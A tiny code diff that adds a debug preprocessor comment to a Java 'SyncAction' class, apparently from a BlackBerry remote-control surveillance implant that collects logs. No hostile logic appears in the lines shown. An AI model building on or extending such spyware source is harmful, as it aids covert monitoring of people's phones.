@@ -24,6 +24,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 import com.ht.rcs.blackberry.utils.WChar;
 
 public class SyncAction extends SubAction {
+	//#debug
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
 
     LogCollector logCollector;
